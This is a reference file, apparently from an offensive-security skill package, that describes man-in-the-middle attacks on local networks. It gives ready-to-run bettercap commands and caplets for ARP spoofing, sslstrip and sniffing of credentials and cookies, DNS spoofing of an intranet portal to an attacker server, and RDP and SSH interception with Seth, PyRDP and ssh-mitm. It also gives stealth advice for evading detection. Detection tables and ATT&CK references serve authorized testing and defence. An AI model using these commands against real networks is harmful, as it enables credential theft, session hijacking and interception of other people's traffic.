# Man-in-the-Middle & Traffic Interception

Once you hold the L2 position (ARP/DHCP/IPv6 from `references/l2-attacks.md`), this is
the inline phase: harvest credentials/cookies, downgrade TLS, spoof DNS, and intercept
clear-or-downgradeable protocols (RDP without NLA, SSH host-key, FTP, HTTP).

---

## 1. bettercap — the inline MitM workhorse

### Theory
bettercap chains ARP spoofing + transparent proxy + sniffer. The `http.proxy` with
`sslstrip` rewrites HTTPS links to HTTP on the victim side for **non-HSTS** sites
(HSTS-preloaded sites cannot be stripped — modern browsers preload most major
domains, so target intranet apps and legacy services).

### Commands (this skill's driver)
```bash
# Active MitM + sniff creds/cookies + sslstrip (this skill):
sudo bash scripts/bettercap_mitm.sh active eth0 10.0.0.50 10.0.0.1
# DNS spoof a single domain to the attacker:
sudo bash scripts/bettercap_mitm.sh dns eth0 10.0.0.50 intranet.corp.local 10.0.0.250
# Passive sniff only (stealthy recon, no ARP poisoning):
sudo bash scripts/bettercap_mitm.sh passive eth0
```
Manual caplet equivalents:
```
set arp.spoof.targets 10.0.0.50
set arp.spoof.fullduplex true        # comment out for half-duplex (stealth)
net.probe on
set net.sniff.regexp (?i)(pass|user|login|token|cookie|authorization)
arp.spoof on; net.sniff on
set http.proxy.sslstrip true; http.proxy on
```
- **Caplets/ui**: bettercap's web-ui (`-caplet http-ui`) gives live creds/cookies.
- **Cookie theft**: sniffed `Cookie:`/`Set-Cookie:` from non-TLS or stripped sessions
  → session hijack (replay in your browser).

### Detection / OPSEC
See ARP detection in `l2-attacks.md` (DAI, arpwatch). sslstrip is visible to the
victim as `http://` where they expect `https://` and breaks on HSTS. Half-duplex
(target-only) reduces ARP volume. Always let bettercap restore ARP on exit.

---

## 2. DNS spoofing for service redirection

With the inline position, answer DNS to point a service name at your rogue server
(capture creds, serve a fake login, or relay). Pairs with rogue SMB/HTTP/LDAP
(Responder) or a phishing page.
```bash
# Redirect intranet portal -> attacker capture page, harvest creds:
set dns.spoof.domains intranet.corp.local
set dns.spoof.address 10.0.0.250
set dns.spoof.all true
dns.spoof on
```
Detection: a host answering DNS that isn't the resolver; clients resolving an internal
name to an unexpected IP. OPSEC: scope to one domain (`dns.spoof.domains`) — spoofing
`*` is loud and breaks the victim's connectivity (suspicious).

---

## 3. RDP MitM (NLA disabled) — credential interception

### Theory
If Network Level Authentication (NLA/CredSSP) is **off**, the RDP handshake can be
proxied and credentials/keystrokes captured (PyRDP / Seth). NLA on (the modern
default) defeats this — but legacy hosts, IoT/OT consoles, and misconfigured jump
boxes still ship NLA-off.
```bash
# Seth: ARP-spoof victim<->DC and proxy RDP, downgrade to capturable security
./seth.sh eth0 <VICTIM_IP> <DC_IP> [<GATEWAY>]
# PyRDP (richer: keylog, clipboard, file transfer capture, live view):
pyrdp-mitm.py <RDP_SERVER_IP> -k private.pem -c certificate.pem
#   point the victim at the pyrdp listener (DNS/ARP spoof) -> creds + session recording
```
Detection: RDP security downgrade (TLS→RDP-standard) in `rdp-enum-encryption` NSE;
certificate mismatch warnings on the client; MitM box bridging victim↔server. OPSEC:
only works pre-NLA; certificate warning may alert a savvy user — auto-accept clients
(thin clients, RDP files with `enablecredsspsupport:i:0`) are the soft targets.

---

## 4. Protocol downgrade / clear-text harvest

Inline, sniff or actively downgrade legacy/clear protocols:
- **FTP/Telnet/HTTP-Basic/SNMPv1/2c**: clear credentials in `net.sniff`.
- **SMTP/IMAP/POP3 STARTTLS stripping**: strip the `STARTTLS` capability so the client
  sends creds in clear (bettercap `mitm6`-style or `mitmproxy` addon).
- **SSH**: cannot decrypt, but a first-connection host-key MitM works if the victim
  has no pinned key (TOFU) — sshmitm/ssh-mitm captures the password on key accept.
```bash
ssh-mitm server --remote-host <REAL_SSH_SERVER>   # capture password on TOFU accept
```
Detection: protocol-anomaly (STARTTLS advertised then withdrawn), SSH host-key change
warnings, clear-text auth on the wire (NDR). OPSEC: STARTTLS stripping is detectable
by clients that require TLS; SSH host-key change is a loud client-side warning.

---

## Detection summary (this cluster)
| Technique | Telemetry / IOC | Detection |
|---|---|---|
| ARP/DNS spoof inline | dup-MAC, gateway MAC change, rogue DNS answers | DAI, arpwatch, DNS-source allowlist |
| sslstrip | victim sees http:// for https sites; breaks on HSTS | HSTS preload; browser warnings |
| RDP MitM | RDP sec downgrade, cert mismatch | NLA enforced; rdp-enum-encryption NSE |
| STARTTLS strip | advertised-then-gone STARTTLS | require-TLS client policy |
| SSH TOFU MitM | host-key change warning | host-key pinning / known_hosts mgmt |

## OPSEC (this cluster)
- All of this depends on the L2 position — its noise (ARP) is the primary exposure.
- Inline MitM touches **no disk on the victim**; artifacts are on the attacker box
  (pcaps, pyrdp recordings) — handle per ROE/data-handling rules.
- Modern defaults (HSTS, NLA, TLS-everywhere) shrink this surface to legacy/intranet/
  OT. Report it as a *defense-in-depth* finding, not a guaranteed path.

## References
- bettercap docs (caplets, http.proxy sslstrip, dns.spoof) — bettercap.org.
- GoSecure PyRDP (RDP MitM / session recording) GitHub.
- SySS Seth (RDP downgrade MitM) GitHub.
- ssh-mitm project. MITRE ATT&CK T1557 (Adversary-in-the-Middle), T1040 (Network
  Sniffing), T1185 (Browser Session Hijacking via stolen cookies).
